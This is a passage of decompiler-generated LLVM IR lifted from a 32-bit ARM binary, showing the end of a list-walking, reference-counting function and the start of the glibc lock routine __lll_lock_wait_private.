  store i32 %v0_13c44, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13c48

dec_label_pc_13c48:                               ; preds = %dec_label_pc_13c14, %dec_label_pc_13c30.dec_label_pc_13c24_crit_edge, %dec_label_pc_13c44
  %v0_13c48 = phi i32 [ %v0_13c44, %dec_label_pc_13c44 ], [ %v2_13c24120, %dec_label_pc_13c14 ], [ %v2_13c24, %dec_label_pc_13c30.dec_label_pc_13c24_crit_edge ]
  %v1_13c48 = phi i32 [ %v0_13c44, %dec_label_pc_13c44 ], [ %v3_13c14, %dec_label_pc_13c14 ], [ %v1_13c28.pre, %dec_label_pc_13c30.dec_label_pc_13c24_crit_edge ]
  %v3_13c48 = icmp uge i32 %v0_13c48, %v1_13c48
  store i1 %v3_13c48, i1* %cpsr_c.global-to-local, align 1
  %v9_13c48 = icmp eq i32 %v0_13c48, %v1_13c48
  store i32 %v2_13bf0, i32* %r4.global-to-local, align 4
  br i1 %v9_13c48, label %dec_label_pc_13be0, label %dec_label_pc_13c48.dec_label_pc_13c14_crit_edge

dec_label_pc_13c48.dec_label_pc_13c14_crit_edge:  ; preds = %dec_label_pc_13c48
  %v0_13c14.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_13c18.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13c14

dec_label_pc_13c64:                               ; preds = %dec_label_pc_13c58.backedge, %entry
  %v0_13c6c31 = phi i32 [ ptrtoint (i32* @global_var_219e0.355 to i32), %entry ], [ %v0_13c58, %dec_label_pc_13c58.backedge ]
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13c68

dec_label_pc_13c68.loopexit:                      ; preds = %bb72
  store i32 %v2_13bf0, i32* %r6.global-to-local, align 4
  %v0_13c6c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13c68

dec_label_pc_13c68:                               ; preds = %dec_label_pc_13c68.loopexit, %dec_label_pc_13c64
  %v0_13c6c = phi i32 [ %v0_13c6c.pre, %dec_label_pc_13c68.loopexit ], [ %v0_13c6c31, %dec_label_pc_13c64 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_13c6c = add i32 %v0_13c6c, 152
  %v3_13c6c = inttoptr i32 %v2_13c6c to i32*
  %v4_13c6c = load i32, i32* %v3_13c6c, align 4
  store i32 %v4_13c6c, i32* %r7.global-to-local, align 4
  %v0_13c70 = call i32 @__aeabi_read_tp()
  store i32 %v0_13c70, i32* %r0.global-to-local, align 4
  %v1_13c74 = add i32 %v4_13c6c, 8
  %v2_13c74 = inttoptr i32 %v1_13c74 to i32*
  %v3_13c74 = load i32, i32* %v2_13c74, align 4
  store i32 %v3_13c74, i32* %r3.global-to-local, align 4
  %v1_13c78 = add i32 %v0_13c70, -1168
  store i32 %v1_13c78, i32* %r5.global-to-local, align 4
  %v3_13c7c = icmp uge i32 %v3_13c74, %v1_13c78
  store i1 %v3_13c7c, i1* %cpsr_c.global-to-local, align 1
  %v9_13c7c = icmp eq i32 %v3_13c74, %v1_13c78
  br i1 %v9_13c7c, label %dec_label_pc_13de4, label %dec_label_pc_13c84

dec_label_pc_13c84:                               ; preds = %dec_label_pc_13c68
  store i32 %v4_13c6c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_13c90112 = inttoptr i32 %v4_13c6c to i32*
  %v2_13c90113 = load i32, i32* %v1_13c90112, align 4
  store i32 %v2_13c90113, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_13c94115 = icmp eq i32 %v2_13c90113, 0
  br i1 %v9_13c94115, label %dec_label_pc_13c9c, label %dec_label_pc_13cb4

dec_label_pc_13c9c:                               ; preds = %dec_label_pc_13c84, %dec_label_pc_13c9c.dec_label_pc_13c90_crit_edge
  %v0_13c9c116 = phi i32 [ %v1_13c94.pre, %dec_label_pc_13c9c.dec_label_pc_13c90_crit_edge ], [ 0, %dec_label_pc_13c84 ]
  store i32 %v0_13c9c116, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13cac = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13cac, label %dec_label_pc_13cb0, label %dec_label_pc_13c9c.dec_label_pc_13c90_crit_edge

dec_label_pc_13c9c.dec_label_pc_13c90_crit_edge:  ; preds = %dec_label_pc_13c9c
  %v0_13c90.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13c94.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13c90 = inttoptr i32 %v0_13c90.pre to i32*
  %v2_13c90 = load i32, i32* %v1_13c90, align 4
  store i32 %v2_13c90, i32* %r3.global-to-local, align 4
  %v3_13c94 = icmp uge i32 %v2_13c90, %v1_13c94.pre
  store i1 %v3_13c94, i1* %cpsr_c.global-to-local, align 1
  %v9_13c94 = icmp eq i32 %v2_13c90, %v1_13c94.pre
  br i1 %v9_13c94, label %dec_label_pc_13c9c, label %dec_label_pc_13cb4

dec_label_pc_13cb0:                               ; preds = %dec_label_pc_13c9c
  %v0_13cb0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13cb0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13cb4

dec_label_pc_13cb4:                               ; preds = %dec_label_pc_13c84, %dec_label_pc_13c9c.dec_label_pc_13c90_crit_edge, %dec_label_pc_13cb0
  %v0_13cb4 = phi i32 [ %v0_13cb0, %dec_label_pc_13cb0 ], [ %v2_13c90113, %dec_label_pc_13c84 ], [ %v2_13c90, %dec_label_pc_13c9c.dec_label_pc_13c90_crit_edge ]
  %v1_13cb4 = phi i32 [ %v0_13cb0, %dec_label_pc_13cb0 ], [ 0, %dec_label_pc_13c84 ], [ %v1_13c94.pre, %dec_label_pc_13c9c.dec_label_pc_13c90_crit_edge ]
  %v3_13cb4 = icmp uge i32 %v0_13cb4, %v1_13cb4
  store i1 %v3_13cb4, i1* %cpsr_c.global-to-local, align 1
  %v9_13cb4 = icmp eq i32 %v0_13cb4, %v1_13cb4
  br i1 %v9_13cb4, label %bb74, label %bb73

bb73:                                             ; preds = %dec_label_pc_13cb4
  %v1_13cb8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_13cb8, i32* %r0.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %dec_label_pc_13cb4, %bb73
  %v1_13cbc = xor i1 %v9_13cb4, true
  call void @__pseudo_cond_branch(i1 %v1_13cbc, i32 ptrtoint (i32* @global_var_13f34.514 to i32))
  %v0_13cc0 = load i32, i32* %r5.global-to-local, align 4
  %v1_13cc0 = load i32, i32* %r7.global-to-local, align 4
  %v2_13cc0 = add i32 %v1_13cc0, 8
  %v3_13cc0 = inttoptr i32 %v2_13cc0 to i32*
  store i32 %v0_13cc0, i32* %v3_13cc0, align 4
  br label %dec_label_pc_13de4

dec_label_pc_13de4:                               ; preds = %bb74, %dec_label_pc_13c68
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_13cc8 = load i32, i32* %r8.global-to-local, align 4
  %v2_13cc8 = add i32 %v0_13cc8, 152
  %v3_13cc8 = inttoptr i32 %v2_13cc8 to i32*
  %v4_13cc8 = load i32, i32* %v3_13cc8, align 4
  store i32 %v4_13cc8, i32* %r2.global-to-local, align 4
  %v1_13ccc = add i32 %v4_13cc8, 4
  %v2_13ccc = inttoptr i32 %v1_13ccc to i32*
  %v3_13ccc = load i32, i32* %v2_13ccc, align 4
  %v1_13cd0 = add i32 %v3_13ccc, 1
  store i32 %v1_13cd0, i32* %r3.global-to-local, align 4
  store i32 %v1_13cd0, i32* %v2_13ccc, align 4
  %v0_13cd8 = load i32, i32* %r5.global-to-local, align 4
  %v1_13cd8 = add i32 %v0_13cd8, 108
  %v2_13cd8 = inttoptr i32 %v1_13cd8 to i32*
  %v3_13cd8 = load i32, i32* %v2_13cd8, align 4
  store i32 %v3_13cd8, i32* %sl.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  %v1_13ce0 = sub i32 0, %v3_13cd8
  store i32 %v1_13ce0, i32* %v2_13cd8, align 4
  store i32 18874385, i32* %r0.global-to-local, align 4
  %v0_13cf4 = load i32, i32* %r5.global-to-local, align 4
  %v1_13cf4 = add i32 %v0_13cf4, 104
  store i32 %v1_13cf4, i32* %r4.global-to-local, align 4
  store i32 120, i32* %r7.global-to-local, align 4
  store i32 18874385, i32* %r2.global-to-local, align 4
  store i32 18874385, i32* %sb.global-to-local, align 4
  %v0_13de8.pre = load i32, i32* %sl.global-to-local, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_13de8 = add i32 %v0_13cf4, 108
  %v3_13de8 = inttoptr i32 %v2_13de8 to i32*
  store i32 %v0_13de8.pre, i32* %v3_13de8, align 4
  %v0_13dec = load i32, i32* %r8.global-to-local, align 4
  %v1_13dec = load i32, i32* %r3.global-to-local, align 4
  %v2_13dec = add i32 %v1_13dec, %v0_13dec
  %v3_13dec = inttoptr i32 %v2_13dec to i32*
  %v4_13dec = load i32, i32* %v3_13dec, align 4
  store i32 %v4_13dec, i32* %r0.global-to-local, align 4
  %v1_13df0 = add i32 %v4_13dec, 4
  %v2_13df0 = inttoptr i32 %v1_13df0 to i32*
  %v3_13df0 = load i32, i32* %v2_13df0, align 4
  %v1_13df4 = add i32 %v3_13df0, -1
  store i32 %v1_13df4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13df8 = icmp eq i32 %v1_13df4, 0
  store i32 %v1_13df4, i32* %v2_13df0, align 4
  br i1 %v2_13df8, label %dec_label_pc_13e04, label %dec_label_pc_13ef4thread-pre-split

dec_label_pc_13e04:                               ; preds = %dec_label_pc_13de4
  %v0_13e04 = load i32, i32* %r3.global-to-local, align 4
  %v1_13e04 = load i32, i32* %r0.global-to-local, align 4
  %v2_13e04 = add i32 %v1_13e04, 8
  %v3_13e04 = inttoptr i32 %v2_13e04 to i32*
  store i32 %v0_13e04, i32* %v3_13e04, align 4
  %v0_13e08 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13e08, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13e0c

dec_label_pc_13e0c:                               ; preds = %dec_label_pc_13e3c.dec_label_pc_13e0c_crit_edge, %dec_label_pc_13e04
  %v0_13e0c = phi i32 [ %v0_13e0c.pre, %dec_label_pc_13e3c.dec_label_pc_13e0c_crit_edge ], [ %v0_13e08, %dec_label_pc_13e04 ]
  %v1_13e0c = inttoptr i32 %v0_13e0c to i32*
  %v2_13e0c = load i32, i32* %v1_13e0c, align 4
  store i32 %v2_13e0c, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_13e0c, i32* %r2.global-to-local, align 4
  %v2_13e18100 = load i32, i32* %v1_13e0c, align 4
  store i32 %v2_13e18100, i32* %r3.global-to-local, align 4
  %v3_13e1c102 = icmp uge i32 %v2_13e18100, %v2_13e0c
  store i1 %v3_13e1c102, i1* %cpsr_c.global-to-local, align 1
  %v9_13e1c108 = icmp eq i32 %v2_13e18100, %v2_13e0c
  br i1 %v9_13e1c108, label %dec_label_pc_13e24, label %dec_label_pc_13e3c

dec_label_pc_13e24:                               ; preds = %dec_label_pc_13e0c, %dec_label_pc_13e24.dec_label_pc_13e18_crit_edge
  %v0_13e24109 = phi i32 [ %v1_13e1c.pre, %dec_label_pc_13e24.dec_label_pc_13e18_crit_edge ], [ %v2_13e0c, %dec_label_pc_13e0c ]
  store i32 %v0_13e24109, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13e34 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13e34, label %dec_label_pc_13e38, label %dec_label_pc_13e24.dec_label_pc_13e18_crit_edge

dec_label_pc_13e24.dec_label_pc_13e18_crit_edge:  ; preds = %dec_label_pc_13e24
  %v0_13e18.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13e1c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13e18 = inttoptr i32 %v0_13e18.pre to i32*
  %v2_13e18 = load i32, i32* %v1_13e18, align 4
  store i32 %v2_13e18, i32* %r3.global-to-local, align 4
  %v3_13e1c = icmp uge i32 %v2_13e18, %v1_13e1c.pre
  store i1 %v3_13e1c, i1* %cpsr_c.global-to-local, align 1
  %v9_13e1c = icmp eq i32 %v2_13e18, %v1_13e1c.pre
  br i1 %v9_13e1c, label %dec_label_pc_13e24, label %dec_label_pc_13e3c

dec_label_pc_13e38:                               ; preds = %dec_label_pc_13e24
  %v0_13e38 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13e38, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13e3c

dec_label_pc_13e3c:                               ; preds = %dec_label_pc_13e0c, %dec_label_pc_13e24.dec_label_pc_13e18_crit_edge, %dec_label_pc_13e38
  %v0_13e44 = phi i32 [ %v0_13e38, %dec_label_pc_13e38 ], [ %v2_13e18100, %dec_label_pc_13e0c ], [ %v2_13e18, %dec_label_pc_13e24.dec_label_pc_13e18_crit_edge ]
  %v1_13e3c = phi i32 [ %v0_13e38, %dec_label_pc_13e38 ], [ %v2_13e0c, %dec_label_pc_13e0c ], [ %v1_13e1c.pre, %dec_label_pc_13e24.dec_label_pc_13e18_crit_edge ]
  %v3_13e3c = icmp uge i32 %v0_13e44, %v1_13e3c
  store i1 %v3_13e3c, i1* %cpsr_c.global-to-local, align 1
  %v9_13e3c = icmp eq i32 %v0_13e44, %v1_13e3c
  br i1 %v9_13e3c, label %dec_label_pc_13e44, label %dec_label_pc_13e3c.dec_label_pc_13e0c_crit_edge

dec_label_pc_13e3c.dec_label_pc_13e0c_crit_edge:  ; preds = %dec_label_pc_13e3c
  %v0_13e0c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13e0c

dec_label_pc_13e44:                               ; preds = %dec_label_pc_13e3c
  %v2_13e44 = icmp ne i32 %v1_13e3c, 0
  store i1 %v2_13e44, i1* %cpsr_c.global-to-local, align 1
  %v7_13e48 = icmp slt i32 %v1_13e3c, 2
  br i1 %v7_13e48, label %dec_label_pc_13ef4thread-pre-split, label %dec_label_pc_13e4c

dec_label_pc_13e4c:                               ; preds = %dec_label_pc_13e44
  %v0_13e4c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13e4c, i32* %r0.global-to-local, align 4
  %v0_13e50 = load i32, i32* @r1, align 4
  %v1_13e50 = add i32 %v0_13e50, 129
  store i32 %v1_13e50, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13ef4thread-pre-split

dec_label_pc_13e68:                               ; preds = %dec_label_pc_13ef4thread-pre-split, %dec_label_pc_13ef0
  %v0_13e68 = phi i32 [ %v3_13ef0, %dec_label_pc_13ef0 ], [ %v0_13ef4.pr, %dec_label_pc_13ef4thread-pre-split ]
  %v1_13e68 = inttoptr i32 %v0_13e68 to i32*
  %v2_13e68 = load i32, i32* %v1_13e68, align 4
  store i32 %v2_13e68, i32* %r3.global-to-local, align 4
  %v1_13e6c = add i32 %v2_13e68, 8
  %v2_13e6c = inttoptr i32 %v1_13e6c to i32*
  %v3_13e6c = load i32, i32* %v2_13e6c, align 4
  store i32 %v3_13e6c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13e70 = icmp eq i32 %v3_13e6c, 0
  br i1 %v2_13e70, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_13e68
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_13e68, %bb75
  %v2_13e78 = xor i1 %v2_13e70, true
  call void @__pseudo_cond_branch(i1 %v2_13e78, i32 %v3_13e6c)
  %v0_13e7c = load i32, i32* %r6.global-to-local, align 4
  %v1_13e7c = inttoptr i32 %v0_13e7c to i32*
  %v2_13e7c = load i32, i32* %v1_13e7c, align 4
  store i32 %v2_13e7c, i32* %r5.global-to-local, align 4
  %v1_13e80 = add i32 %v2_13e7c, 20
  store i32 %v1_13e80, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13e84

dec_label_pc_13e84:                               ; preds = %dec_label_pc_13eb8.dec_label_pc_13e84_crit_edge, %bb76
  %v0_13e88 = phi i32 [ %v0_13e88.pre, %dec_label_pc_13eb8.dec_label_pc_13e84_crit_edge ], [ %v1_13e80, %bb76 ]
  %v0_13e84 = phi i32 [ %v0_13e84.pre, %dec_label_pc_13eb8.dec_label_pc_13e84_crit_edge ], [ %v2_13e7c, %bb76 ]
  %v1_13e84 = add i32 %v0_13e84, 20
  %v2_13e84 = inttoptr i32 %v1_13e84 to i32*
  %v3_13e84 = load i32, i32* %v2_13e84, align 4
  store i32 %v0_13e88, i32* %r2.global-to-local, align 4
  store i32 %v3_13e84, i32* %r4.global-to-local, align 4
  %v1_13e90 = add i32 %v3_13e84, -1
  store i32 %v1_13e90, i32* @r1, align 4
  %v1_13e9487 = inttoptr i32 %v0_13e88 to i32*
  %v2_13e9488 = load i32, i32* %v1_13e9487, align 4
  store i32 %v2_13e9488, i32* %r3.global-to-local, align 4
  %v3_13e9890 = icmp uge i32 %v2_13e9488, %v3_13e84
  store i1 %v3_13e9890, i1* %cpsr_c.global-to-local, align 1
  %v9_13e9896 = icmp eq i32 %v2_13e9488, %v3_13e84
  br i1 %v9_13e9896, label %dec_label_pc_13ea0, label %dec_label_pc_13eb8

dec_label_pc_13ea0:                               ; preds = %dec_label_pc_13e84, %dec_label_pc_13ea0.dec_label_pc_13e94_crit_edge
  %v0_13ea097 = phi i32 [ %v1_13e98.pre, %dec_label_pc_13ea0.dec_label_pc_13e94_crit_edge ], [ %v3_13e84, %dec_label_pc_13e84 ]
  store i32 %v0_13ea097, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13eb0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13eb0, label %dec_label_pc_13eb4, label %dec_label_pc_13ea0.dec_label_pc_13e94_crit_edge

dec_label_pc_13ea0.dec_label_pc_13e94_crit_edge:  ; preds = %dec_label_pc_13ea0
  %v0_13e94.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13e98.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13e94 = inttoptr i32 %v0_13e94.pre to i32*
  %v2_13e94 = load i32, i32* %v1_13e94, align 4
  store i32 %v2_13e94, i32* %r3.global-to-local, align 4
  %v3_13e98 = icmp uge i32 %v2_13e94, %v1_13e98.pre
  store i1 %v3_13e98, i1* %cpsr_c.global-to-local, align 1
  %v9_13e98 = icmp eq i32 %v2_13e94, %v1_13e98.pre
  br i1 %v9_13e98, label %dec_label_pc_13ea0, label %dec_label_pc_13eb8

dec_label_pc_13eb4:                               ; preds = %dec_label_pc_13ea0
  %v0_13eb4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13eb4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13eb8

dec_label_pc_13eb8:                               ; preds = %dec_label_pc_13e84, %dec_label_pc_13ea0.dec_label_pc_13e94_crit_edge, %dec_label_pc_13eb4
  %v0_13ec4 = phi i32 [ %v0_13eb4, %dec_label_pc_13eb4 ], [ %v2_13e9488, %dec_label_pc_13e84 ], [ %v2_13e94, %dec_label_pc_13ea0.dec_label_pc_13e94_crit_edge ]
  %v1_13eb8 = phi i32 [ %v0_13eb4, %dec_label_pc_13eb4 ], [ %v3_13e84, %dec_label_pc_13e84 ], [ %v1_13e98.pre, %dec_label_pc_13ea0.dec_label_pc_13e94_crit_edge ]
  %v3_13eb8 = icmp uge i32 %v0_13ec4, %v1_13eb8
  store i1 %v3_13eb8, i1* %cpsr_c.global-to-local, align 1
  %v9_13eb8 = icmp eq i32 %v0_13ec4, %v1_13eb8
  store i32 %v0_13ec4, i32* %r2.global-to-local, align 4
  br i1 %v9_13eb8, label %dec_label_pc_13ec4, label %dec_label_pc_13eb8.dec_label_pc_13e84_crit_edge

dec_label_pc_13eb8.dec_label_pc_13e84_crit_edge:  ; preds = %dec_label_pc_13eb8
  %v0_13e84.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_13e88.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13e84

dec_label_pc_13ec4:                               ; preds = %dec_label_pc_13eb8
  %v2_13ec4 = icmp ne i32 %v1_13eb8, 0
  store i1 %v2_13ec4, i1* %cpsr_c.global-to-local, align 1
  %v7_13ec4 = icmp eq i32 %v1_13eb8, 1
  %v0_13ecc = load i32, i32* %r6.global-to-local, align 4
  br i1 %v7_13ec4, label %dec_label_pc_13ecc, label %dec_label_pc_13ef0

dec_label_pc_13ecc:                               ; preds = %dec_label_pc_13ec4
  %v1_13ecc = inttoptr i32 %v0_13ecc to i32*
  %v2_13ecc = load i32, i32* %v1_13ecc, align 4
  store i32 %v2_13ecc, i32* @r1, align 4
  %v1_13ed0 = add i32 %v2_13ecc, 24
  %v2_13ed0 = inttoptr i32 %v1_13ed0 to i32*
  %v3_13ed0 = load i32, i32* %v2_13ed0, align 4
  store i32 %v3_13ed0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13ed4 = icmp eq i32 %v3_13ed0, 0
  br i1 %v2_13ed4, label %dec_label_pc_13ef0, label %dec_label_pc_13edc

dec_label_pc_13edc:                               ; preds = %dec_label_pc_13ecc
  %v1_13edc = add i32 %v2_13ecc, 20
  %v2_13edc = inttoptr i32 %v1_13edc to i32*
  %v3_13edc = load i32, i32* %v2_13edc, align 4
  store i32 %v3_13edc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 129, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13ef0

dec_label_pc_13ef0:                               ; preds = %dec_label_pc_13ec4, %dec_label_pc_13edc, %dec_label_pc_13ecc
  %v1_13ef0 = add i32 %v0_13ecc, 4
  %v2_13ef0 = inttoptr i32 %v1_13ef0 to i32*
  %v3_13ef0 = load i32, i32* %v2_13ef0, align 4
  store i32 %v3_13ef0, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13ef4 = icmp eq i32 %v3_13ef0, 0
  br i1 %v2_13ef4, label %dec_label_pc_13efc, label %dec_label_pc_13e68

dec_label_pc_13ef4thread-pre-split:               ; preds = %dec_label_pc_13e4c, %dec_label_pc_13e44, %dec_label_pc_13de4
  %v0_13ef4.pr = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13ef411 = icmp eq i32 %v0_13ef4.pr, 0
  br i1 %v2_13ef411, label %dec_label_pc_13efc, label %dec_label_pc_13e68

dec_label_pc_13efc:                               ; preds = %dec_label_pc_13ef0, %dec_label_pc_13ef4thread-pre-split
  %v0_13efc.pre = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_13efc.pre, i32* %r0.global-to-local, align 4
  ret i32 %v0_13efc.pre

; uselistorder directives
  uselistorder i32 %v0_13ef4.pr, { 1, 0 }
  uselistorder i32 %v3_13ef0, { 1, 2, 0 }
  uselistorder i32 %v1_13eb8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13eb4, { 1, 0, 2 }
  uselistorder i32 %v1_13e98.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_13e38, { 1, 0, 2 }
  uselistorder i32 %v1_13e1c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_13e0c, { 1, 0 }
  uselistorder i32 %v0_13cb0, { 1, 0, 2 }
  uselistorder i32 %v1_13c94.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_13c6c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_13c44, { 1, 0, 2 }
  uselistorder i32 %v1_13c28.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_13bf0, { 1, 0, 2 }
  uselistorder i32 %v0_13bd0, { 1, 0, 2 }
  uselistorder i32 %v1_13bb4.pre, { 0, 3, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 14, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 13, 12, 0 }
  uselistorder i32* %r6.global-to-local, { 3, 7, 5, 6, 4, 0, 1, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5, 6, 8, 7, 9, 10, 12, 11, 13, 14, 16, 15, 17 }
  uselistorder i32* %r3.global-to-local, { 34, 5, 6, 8, 7, 0, 9, 10, 11, 12, 14, 13, 2, 15, 16, 17, 18, 19, 20, 21, 23, 22, 1, 24, 25, 26, 28, 27, 3, 29, 30, 32, 31, 4, 33 }
  uselistorder i32* %r0.global-to-local, { 12, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i1* %cpsr_c.global-to-local, { 5, 13, 7, 8, 9, 11, 10, 2, 12, 14, 15, 17, 16, 1, 18, 19, 21, 20, 0, 22, 23, 25, 24, 3, 26, 27, 28, 30, 29, 4, 32, 31, 6 }
  uselistorder i32 108, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_13efc, { 1, 0 }
  uselistorder label %dec_label_pc_13ef0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13eb8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13ea0, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %dec_label_pc_13e3c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13e24, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_13cb4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13c9c, { 1, 0 }
  uselistorder label %dec_label_pc_13c48, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13c30, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_13bd4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13bbc, { 1, 0 }
  uselistorder label %dec_label_pc_13c58.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_13b88, { 1, 0 }
}

define i32 @__lll_lock_wait_private(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13f34 = load i32, i32* @r4, align 4
  store i32 %v3_13f34, i32* %stack_var_-16, align 4
  %v0_13f38 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13f38, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13f3c

dec_label_pc_13f3c:                               ; preds = %dec_label_pc_13fbc.dec_label_pc_13f3c_crit_edge, %entry
  %v0_13f40 = phi i32 [ %v0_13f40.pre, %dec_label_pc_13fbc.dec_label_pc_13f3c_crit_edge ], [ %v0_13f38, %entry ]
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_13f40, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v1_13f4817 = inttoptr i32 %v0_13f40 to i32*
  %v2_13f4818 = load i32, i32* %v1_13f4817, align 4
  %v3_13f4c20 = icmp ne i32 %v2_13f4818, 0
  store i1 %v3_13f4c20, i1* %cpsr_c.global-to-local, align 1
  %v9_13f4c26 = icmp eq i32 %v2_13f4818, 1
  br i1 %v9_13f4c26, label %dec_label_pc_13f54, label %dec_label_pc_13f6c

dec_label_pc_13f54:                               ; preds = %dec_label_pc_13f3c, %dec_label_pc_13f54.dec_label_pc_13f48_crit_edge
  %v0_13f5427 = phi i32 [ %v1_13f4c.pre, %dec_label_pc_13f54.dec_label_pc_13f48_crit_edge ], [ 1, %dec_label_pc_13f3c ]
  store i32 %v0_13f5427, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13f64 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13f64, label %dec_label_pc_13f68, label %dec_label_pc_13f54.dec_label_pc_13f48_crit_edge

dec_label_pc_13f54.dec_label_pc_13f48_crit_edge:  ; preds = %dec_label_pc_13f54
  %v0_13f48.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13f4c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13f48 = inttoptr i32 %v0_13f48.pre to i32*
  %v2_13f48 = load i32, i32* %v1_13f48, align 4
  %v3_13f4c = icmp uge i32 %v2_13f48, %v1_13f4c.pre
  store i1 %v3_13f4c, i1* %cpsr_c.global-to-local, align 1
  %v9_13f4c = icmp eq i32 %v2_13f48, %v1_13f4c.pre
  br i1 %v9_13f4c, label %dec_label_pc_13f54, label %dec_label_pc_13f6c

dec_label_pc_13f68:                               ; preds = %dec_label_pc_13f54
  %v0_13f68 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13f6c

dec_label_pc_13f6c:                               ; preds = %dec_label_pc_13f3c, %dec_label_pc_13f54.dec_label_pc_13f48_crit_edge, %dec_label_pc_13f68
